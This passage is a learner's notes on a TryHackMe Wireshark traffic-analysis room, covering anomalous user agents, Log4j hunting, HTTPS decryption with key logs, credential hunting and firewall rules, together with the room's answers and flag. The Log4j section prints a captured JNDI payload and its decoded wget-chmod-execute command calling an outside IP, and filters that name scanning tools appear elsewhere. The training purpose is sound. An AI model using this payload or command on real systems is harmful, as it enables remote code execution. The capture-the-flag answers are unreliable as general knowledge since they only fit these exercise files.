-   Audit tools info like Nmap, Nikto, Wfuzz and sqlmap in the user agent field.
-   Payload data in the user agent field.

-   `(http.user_agent contains "sqlmap") or (http.user_agent contains "Nmap") or (http.user_agent contains "Wfuzz") or (http.user_agent contains "Nikto")`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/8c114d533e1914300bae23b19d3e6f40.png)

Log4j Analysis   

A proper investigation starts with prior research on threats and anomalies going to be hunted. Let's review the knowns on the "Log4j" attack before launching Wireshark.  
  

Log4j vulnerability analysis in a nutshell:  

**Notes**

**Wireshark Filters**

**Research outcomes** for grabbing the low-hanging fruits:

-   The attack starts with a "POST" request
-   There are known cleartext patterns: "**jndi:ldap**" and "**Exploit.class**".

-   `http.request.method == "POST"`

-   `(ip contains "jndi") or ( ip contains "Exploit")`

-   `(frame contains "jndi") or ( frame contains "Exploit")`

-   `(http.user_agent contains "$") or (http.user_agent contains "==")`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/8c3bc1fb4090582de2e36452de4d7d3a.png)

Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!

  
Use the "Desktop/exercise-pcaps/http/user-agent.cap" file.  

Investigate the user agents. What is the number of anomalous  "user-agent" types?

1) The answer is not the number of packets. It is the number of anomalous user-agent types. You need to filter the "user agent" info "as a column" and conduct a manual investigation of the packet details to spot the anomalies. 2) In addition to the obvious "non-standard" and modified user agent types: Does "Windows NT 6.4" exist?

![[Pasted image 20221212114500.png]]

![[Pasted image 20221212114818.png]]

![[Pasted image 20221212115517.png]]


![[Pasted image 20221212115454.png]]


![[Pasted image 20221212115438.png]]


There are 6 anomalous user-agents: Windows NT 6.4, nmap, Wfuzz, sqlmap, and Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0 (uploaded shell b374k.php), and log4j

*6*

  
What is the packet number with a subtle spelling difference in the user agent field?
Mozlila

![[Pasted image 20221212120046.png]]


*52*

  
Use the "Desktop/exercise-pcaps/http/http.pcapng" file.  
Locate the "Log4j" attack starting phase. What is the packet number?

http.request.method == "POST"

jndi , found packet 444
![[Pasted image 20221212120436.png]]


*444*
  
Locate the "Log4j" attack starting phase and decode the base64 command. What is the IP address contacted by the adversary? (Enter the address in defanged format and exclude "{}".)

```
found: ${jndi:ldap://45.137.21.9:1389/Basic/Command/Base64/d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==}

wget http://62.210.130.250/lh.sh;chmod +x lh.sh;./lh.sh

ip: 62.210.130.250

defanging ip: 62[.]210[.]130[.]250
```

*62[.]210[.]130[.]250*

###  Encrypted Protocol Analysis: Decrypting HTTPS

Decrypting HTTPS Traffic  

When investigating web traffic, analysts often run across encrypted traffic. This is caused by using the Hypertext Transfer Protocol Secure (HTTPS) protocol for enhanced security against spoofing, sniffing and intercepting attacks. HTTPS uses TLS protocol to encrypt communications, so it is impossible to decrypt the traffic and view the transferred data without having the encryption/decryption key pairs. As this protocol provides a good level of security for transmitting sensitive data, attackers and malicious websites also use HTTPS. Therefore, a security analyst should know how to use key files to decrypt encrypted traffic and investigate the traffic activity.

The packets will appear in different colours as the HTTP traffic is encrypted. Also, protocol and info details (actual URL address and data returned from the server) will not be fully visible. The first image below shows the HTTP packets encrypted with the TLS protocol. The second and third images demonstrate filtering HTTP packets without using a key log file.

Additional information for HTTPS :  

Notes

Wireshark Filter

"HTTPS Parameters" for grabbing the low-hanging fruits:

-   **Request:** Listing all requests  
    
-   **TLS:** Global TLS search
-   TLS Client Request
-   TLS Server response
-   Local Simple Service Discovery Protocol (SSDP)

**Note:** SSDP is a network protocol that provides advertisement and discovery of network services.

-   `http.request`

-   `tls`

-   `tls.handshake.type == 1`

-   `tls.handshake.type == 2`

-   `ssdp`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/2558999240f7cc60cfb7588d434f9793.png)

Similar to the TCP three-way handshake process, the TLS protocol has its handshake process. The first two steps contain "Client Hello" and "Server Hello" messages. The given filters show the initial hello packets in a capture file. These filters are helpful to spot which IP addresses are involved in the TLS handshake.  

-   Client Hello: `(http.request or tls.handshake.type == 1) and !(ssdp)` 
-   Server Hello:`(http.request or tls.handshake.type == 2) and !(ssdp)`

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/adad6bec8a257b67664167f52981f820.png)

An encryption key log file is a text file that contains unique key pairs to decrypt the encrypted traffic session. These key pairs are automatically created (per session) when a connection is established with an SSL/TLS-enabled webpage. As these processes are all accomplished in the browser, you need to configure your system and use a suitable browser (Chrome and Firefox support this) to save these values as a key log file. To do this, you will need to set up an environment variable and create the SSLKEYLOGFILE, and the browser will dump the keys to this file as you browse the web. SSL/TLS key pairs are created per session at the connection time, so it is important to dump the keys during the traffic capture. Otherwise, it is not possible to create/generate a suitable key log file to decrypt captured traffic. You can use the "right-click" menu or **"Edit --> Preferences --> Protocols --> TLS"** menu to add/remove key log files.  

**Adding key log files with the "right-click" menu:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/17b1557ea94f23b7a9c6851fddbd366b.png)

Adding key log files with the "Edit --> Preferences --> Protocols --> TLS" menu:

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/7461f414bdc9926827dd54d57e7a8825.png)

**Viewing the traffic with/without the key log files:**

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/5df77f4b111b3ae5b7332456046a5ebc.png)

The above image shows that the traffic details are visible after using the key log file. Note that the packet details and bytes pane provides the data in different formats for investigation. Decompressed header info and HTTP2 packet details are available after decrypting the traffic. Depending on the packet details, you can also have the following data formats:

-   Frame
-   Decrypted TLS
-   Decompressed Header
-   Reassembled TCP
-   Reassembled SSL

Detecting suspicious activities in chunked files is easy and a great way to learn how to focus on the details. Now use the exercise files to put your skills into practice against a single capture file and answer the questions below!  

Answer the questions below

![[Pasted image 20221212122312.png]]

```

CLIENT_HANDSHAKE_TRAFFIC_SECRET f35fff3ca92d297cb03a5f158d65286c7afdd583e6392a84b13a9f7ac431a222 f4ce2a326ffa83c7c1f1fc00e142471438547a951cd6e383f6492a0aa386fcf8
SERVER_HANDSHAKE_TRAFFIC_SECRET f35fff3ca92d297cb03a5f158d65286c7afdd583e6392a84b13a9f7ac431a222 7ebf1f8a0cbe86f2605b4cf95692e87eff41a109bf640817f543fedb8f8f0d04
CLIENT_HANDSHAKE_TRAFFIC_SECRET 56fe125f02c940b756b92628f605a330585ef28f780514d680ed88523be33091 6a3f63a5da6de0a09470383723582aee56e4b1bd483f54ffbd5fa5f66a044c21
SERVER_HANDSHAKE_TRAFFIC_SECRET 56fe125f02c940b756b92628f605a330585ef28f780514d680ed88523be33091 2c4d244b1878e3da8311c429dacfbd3baf68f0a76fd37dff43e4a88f5c3be804
CLIENT_TRAFFIC_SECRET_0 56fe125f02c940b756b92628f605a330585ef28f780514d680ed88523be33091 160fd713d014210e4513754b50f515fec5574a2eef712e8c303b6759d622e7ec

```


Use the "Desktop/exercise-pcaps/https/Exercise.pcap" file.  

What is the frame number of the "Client Hello" message sent to "accounts.google.com"?
"Protocol Details Pane --> TLS --> Handshake Protocol --> Extension: server_name" can help.
![[Pasted image 20221212122555.png]]

	(http.request or tls.handshake.type==1) and !(ssdp)
server name and apply as column then look for frame number


![[Pasted image 20221212123120.png]]

![[Pasted image 20221212123212.png]]

*16*

  
Decrypt the traffic with the "KeysLogFile.txt" file. What is the number of HTTP2 packets?
Import the key file to decrypt the traffic.

http2

![[Pasted image 20221212123404.png]]


*115*

Go to Frame 322. What is the authority header of the HTTP2 packet? (Enter the address in defanged format.)

http2

![[Pasted image 20221212123653.png]]


*safebrowsing[.]googleapis[.]com*
  
Investigate the decrypted packets and find the flag! What is the flag?
You can export objects after decrypting the traffic.

Edit > Find Packet > String > find FLAG{
```
Follow TLS stream

GET /filebin/f7c367c15581fe776cbb3b9eefe6bcd313a46679e274b6085098d81862200f99/21e2ae0fb85fde7bb246ed90194f601e041b3c8ac6e937b1878bd8e0e796a098?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=HZXB1J7T0UN34UN512IW%2F20220623%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220623T232311Z&X-Amz-Expires=30&X-Amz-SignedHeaders=host&response-cache-control=max-age%3D30&response-content-disposition=filename%3D%22flag.txt%22&response-content-type=text%2Fplain%3B%20charset%3Dutf-8&X-Amz-Signature=6570806d2299163ae00b6044b2ca2afc4cb0e5397bcff9cb3ca6762aef0fbe3c HTTP/1.1
Host: situla.bitbit.net
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Referer: https://filebin.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

HTTP/1.1 200 OK
Content-Length: 3412
Accept-Ranges: bytes
Last-Modified: Thu, 23 Jun 2022 23:22:29 GMT
ETag: "9bb949ae18ca676b208df3eacf9de132"
Cache-Control: max-age=30
Content-Disposition: filename="flag.txt"
x-amz-request-id: tx00000000000000393ac60-0062b4f5e2-3c9fbb72-default
Content-Type: text/plain; charset=utf-8
Date: Thu, 23 Jun 2022 23:23:14 GMT
Connection: Keep-Alive

                         __^__                                                        __^__
                        ( ___ )------------------------------------------------------( ___ )
                         | / |                                                        | \ |
                         | / |               FLAG{THM-PACKETMASTER}                   | \ |
                         |___|                                                        |___|
                        (_____)------------------------------------------------------(_____)

                .     .       .  .   . .   .   . .    +  .:..+.. ... :..:.. . ... :..:.. . ..
                .     .  :     .    .. :. .___---------___.::.. ... :..:.. . ..... . ...
                     .  .   .    .  :.:. _".^ .^ ^.  '.. :"-_.:.::... :..:.. . ... :..:.. . .
                   .  :       .  .  .:../:            . .^  :.:\.::... :..:.. . ..... . ... 
                        .   . :: +. :.:/: .   .    .        . . .:\::... :..:.. . ...:.. . .
                 .  :    .     . _ :::/:               .  ^ .  . .:\::... :..:.. . ...:.. . ... 
                  .. . .   . - : :.:./.                        .  .:\::... :..:.. . ... :.. . ... 
                  .      .     . :..|:                    .  .  ^. .:|:: ... :..:.. . ... :..:.. . .
                    .       . : : ..||        .                . . !:|::... :..:.... . ... :.. 
                  .     . . . ::. ::\(                           . :)/:: ... :..:.. . ... :
                 .   .     : . : .:.|. ######              .#######::|::... :..:.. . ... :..:.. . ... 
                  :.. .  :-  : .:  ::|.#######           ..########:|::... :..:.. . ... :..:.. . ..
                 .  .  .  ..  .  .. :\ ########          :######## :/:: ... :..:.. . ...:.. . .
                  .        .+ :: : -.:\ ########       . ########.:/::... :..:.. . ... :..:.. . ... :..:.. 
                    .  .+   . . . . :.:\. #######       #######..:/::     .+ :: : -. . ... :..:.. .
                      :: . . . . ::.:..:.\           .   .   ..:/::  .+ :: : -.... :..:.. . ... 
                   .   .   .  .. :  -::::.\.       | |     . .:/:: -.   . . . .... :..:.. 
                      .  :  .  .  .-:.":.::.\             ..:/:: -.   . . . .... :..:.. . ... :
                 .      -.   . . . .: .:::.:.\.           .:/:.   . . .   .  .  . ... 
                .   .   .  :      : ....::_:..:\   ___.  :/::  . . .   .  .  . ...
                   .   .  .   .:. .. .  .: :.:.:\       :/::.   . . .   .  .  . ... :..
                     +   .   .   : . ::. :.:. .:.|\  .:/|::.   . . .   .  .  . ..
                     .         +   .  .  ...:: ..|  --.:|::.  . . .   .  .  . ..
                .      . . .   .  .  . ... :..:.."(  ..)":: .   . . . 
                 .   .       .      :  .   .: ::/  .  .::\::. . . + : .
                         __^__                                                        __^__
                        ( ___ )------------------------------------------------------( ___ )
                         | / |                                                        | \ |
                         | / |               FLAG{THM-PACKETMASTER}                   | \ |
                         |___|                                                        |___|
                        (_____)------------------------------------------------------(_____)
GET /favicon.ico HTTP/1.1
Host: situla.bitbit.net
Connection: keep-alive
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua-platform: "Windows"
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: image
Referer: https://situla.bitbit.net/filebin/f7c367c15581fe776cbb3b9eefe6bcd313a46679e274b6085098d81862200f99/21e2ae0fb85fde7bb246ed90194f601e041b3c8ac6e937b1878bd8e0e796a098?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=HZXB1J7T0UN34UN512IW%2F20220623%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20220623T232311Z&X-Amz-Expires=30&X-Amz-SignedHeaders=host&response-cache-control=max-age%3D30&response-content-disposition=filename%3D%22flag.txt%22&response-content-type=text%2Fplain%3B%20charset%3Dutf-8&X-Amz-Signature=6570806d2299163ae00b6044b2ca2afc4cb0e5397bcff9cb3ca6762aef0fbe3c
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

HTTP/1.1 404 Not Found
Content-Length: 229
x-amz-request-id: tx00000000000000393ac69-0062b4f5e2-3c9fbb72-default
Accept-Ranges: bytes
Content-Type: application/xml
Date: Thu, 23 Jun 2022 23:23:14 GMT
Connection: Keep-Alive

<?xml version="1.0" encoding="UTF-8"?><Error><Code>NoSuchBucket</Code><BucketName>favicon.ico</BucketName><RequestId>tx00000000000000393ac69-0062b4f5e2-3c9fbb72-default</RequestId><HostId>3c9fbb72-default-default</HostId></Error>

```


![[Pasted image 20221212124442.png]]


*FLAG{THM-PACKETMASTER}*

###  Bonus: Hunt Cleartext Credentials!

**Bonus: Hunt Cleartext Credentials!**

Up to here, we discussed how to inspect the packets for specific conditions and spot anomalies. As mentioned in the first room, Wireshark is not an IDS, but it provides suggestions for some cases under the expert info. However, sometimes anomalies replicate the legitimate traffic, so the detection becomes harder. For example, in a cleartext credential hunting case, it is not easy to spot the multiple credential inputs and decide if there is a brute-force attack or if it is a standard user who mistyped their credentials.

  

As everything is presented at the packet level, it is hard to spot the multiple username/password entries at first glance. The detection time will decrease when an analyst can view the credential entries as a list. Wireshark has such a feature to help analysts who want to hunt cleartext credential entries.

  

Some Wireshark dissectors (FTP, HTTP, IMAP, pop and SMTP) are programmed to extract cleartext passwords from the capture file. You can view detected credentials using the **"Tools --> Credentials"** menu. This feature works only after specific versions of Wireshark (v3.1 and later). Since the feature works only with particular protocols, it is suggested to have manual checks and not entirely rely on this feature to decide if there is a cleartext credential in the traffic.

  

Once you use the feature, it will open a new window and provide detected credentials. It will show the packet number, protocol, username and additional information. This window is clickable; clicking on the packet number will select the packet containing the password, and clicking on the username will select the packet containing the username info. The additional part prompts the packet number that contains the username.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/c8266feccc3836c97ed4fdbd81befc20.png)

  
Use the "Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap" file.  

What is the packet number of the credentials using "HTTP Basic Auth"?
"Tools --> Credentials" can help.

![[Pasted image 20221212125251.png]]


*237*

  
What is the packet number where "empty password" was submitted?

packet number: show pass and username the same (clicking link)

looking and packet 170 is empty pass, i.e 41 admin:moose,  admin:monica, admin:morley and so on.
![[Pasted image 20221212125515.png]]


*170*

### Bonus: Actionable Results!

**Bonus: Actionable Results!**

You have investigated the traffic, detected anomalies and created notes for further investigation. What is next? Not every case investigation is carried out by a crowd team. As a security analyst, there will be some cases you need to spot the anomaly, identify the source and take action. Wireshark is not all about packet details; it can help you to create firewall rules ready to implement with a couple of clicks. You can create firewall rules by using the **"Tools --> Firewall ACL Rules"** menu. Once you use this feature, it will open a new window and provide a combination of rules (IP, port and MAC address-based) for different purposes. Note that these rules are generated for implementation on an outside firewall interface.  

Currently, Wireshark can create rules for:

-   Netfilter (iptables)
-   Cisco IOS (standard/extended)
-   IP Filter (ipfilter)
-   IPFirewall (ipfw)
-   Packet filter (pf)
-   Windows Firewall (netsh new/old format)

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/6131132af49360005df01ae3/room-content/448e790da3f31b8566547cd03804b282.png)

  
Use the "Desktop/exercise-pcaps/bonus/Bonus-exercise.pcap" file.  

Select packet number 99. Create a rule for "IPFirewall (ipfw)". What is the rule for "denying source IPv4 address"?
"Tools --> Firewall ACL Rules" can help.

![[Pasted image 20221212130250.png]]


*add deny ip from 10.121.70.151 to any in*

  
Select packet number 231. Create "IPFirewall" rules. What is the rule for "allowing destination MAC address"?
"Deny" option can help.

untick deny to allow :)


![[Pasted image 20221212130603.png]]


*add allow MAC 00:d0:59:aa:af:80 any in*

### Conclusion

Congratulations! You just finished the "Wireshark: The Traffic Analysis" room.

In this room, we covered how to use the Wireshark to detect anomalies and investigate events of interest at the packet level. Now, we invite you to complete the Wireshark challenge room: [**Carnage**](https://tryhackme.com/room/c2carnage), **Warzone 1** and **Warzone 2**.

Wireshark is a good tool for starting a network security investigation. However, it is not enough to stop the threats. A security analyst should have IDS/IPS knowledge and extended tool skills to detect and prevent anomalies and threats. As the attacks are getting more sophisticated consistently, the use of multiple tools and detection strategies becomes a requirement. The following rooms will help you step forward in network traffic analysis and anomaly/threat detection.  

-   [**NetworkMiner**](https://tryhackme.com/room/networkminer)
-   [**Snort**](https://tryhackme.com/room/snort)
-   [**Snort Challenge -  The Basics**](https://tryhackme.com/room/snortchallenges1)
-   [**Snort Challenge - Live Attacks**](https://tryhackme.com/room/snortchallenges2)
-   [**Zeek**](https://tryhackme.com/room/zeekbro)
-   [**Zeek Exercises**](https://tryhackme.com/room/zeekbroexercises)
-   [**Brim**](https://tryhackme.com/room/brim)



[[Brim]]